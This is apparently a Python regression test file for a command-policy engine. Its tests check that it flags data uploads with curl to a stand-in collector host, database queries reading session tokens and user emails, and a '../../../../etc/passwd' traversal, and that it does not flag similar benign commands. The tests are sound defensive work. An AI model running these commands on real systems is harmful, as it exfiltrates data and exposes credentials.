"""Regression tests derived from locally dismissed Prismor events."""

from pathlib import Path
from unittest.mock import patch

from prismor.runtime.audit import _check_lockfile_presence
from prismor.runtime.deps import find_manifests
from prismor.runtime.policy_engine import PolicyEngine


def _rule_ids(command: str) -> set[str]:
    return {finding["ruleId"] for finding in PolicyEngine().check_command(command)}


def test_curl_get_pipeline_does_not_look_like_upload() -> None:
    command = (
        "curl -fsSL https://services.gradle.org/distributions/"
        "gradle-8.14-all.zip.sha256 | tr -d '\\n' | wc -c"
    )
    assert "network-exfil-tool" not in _rule_ids(command)


def test_curl_upload_flags_still_match() -> None:
    for command in (
        "curl -X POST --data-binary @report.json https://collector.example/upload",
        "curl -F 'file=@report.json' https://collector.example/upload",
        "curl --upload-file report.json https://collector.example/upload",
    ):
        assert "network-exfil-tool" in _rule_ids(command), command


def test_sql_quoted_into_document_is_not_database_access() -> None:
    for command in (
        "printf 'SELECT name FROM sessions' > report.md",
        "cat > report.md <<'EOF'\nSELECT email FROM users\nEOF",
    ):
        assert "db-access" not in _rule_ids(command), command


def test_sensitive_sql_executed_by_database_client_still_matches() -> None:
    for command in (
        "sqlite3 app.db 'SELECT token FROM sessions'",
        "printf 'SELECT email FROM users' | psql app",
    ):
        assert "db-access" in _rule_ids(command), command


def test_project_relative_reads_are_not_path_traversal() -> None:
    command = (
        "cd assets/icons && cat ../brand/menashi-mark.svg && "
        "cat ../../crawl-concierge-v2/README.md"
    )
    assert "path-traversal" not in _rule_ids(command)


def test_relative_sensitive_file_traversal_still_matches() -> None:
    assert "path-traversal" in _rule_ids("cat ../../../../etc/passwd")


def test_manifest_walk_skips_unreadable_child(tmp_path: Path) -> None:
    """One unreadable cross-user child must not abort the whole audit walk."""
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    blocked = tmp_path / "cross-user"
    blocked.mkdir()
    real_exists = Path.exists

    def permission_error_for_blocked_git(path: Path) -> bool:
        if path == blocked / ".git":
            raise PermissionError(13, "Permission denied", str(path))
        return real_exists(path)

    with patch.object(Path, "exists", permission_error_for_blocked_git):
        manifests = find_manifests(tmp_path)
        audit_findings = _check_lockfile_presence(tmp_path)

    assert [Path(item["path"]) for item in manifests] == [tmp_path / "package.json"]
    assert len(audit_findings) == 1
    assert audit_findings[0].severity == "MEDIUM"
